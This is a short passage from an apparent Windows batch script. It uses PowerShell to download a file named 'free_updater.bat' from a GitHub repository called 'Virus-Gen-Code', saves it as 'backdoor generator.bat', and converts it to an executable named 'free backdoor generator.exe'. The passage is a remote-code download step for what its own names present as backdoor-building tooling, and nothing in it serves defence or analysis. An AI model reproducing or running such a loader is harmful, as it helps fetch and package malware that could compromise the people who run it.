...
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_updater.bat").Content >"C:\programdata\backdoor generator.bat"
echo converting file to exe...
call bat2exe.bat "backdoor generator.bat" "free backdoor generator.exe"
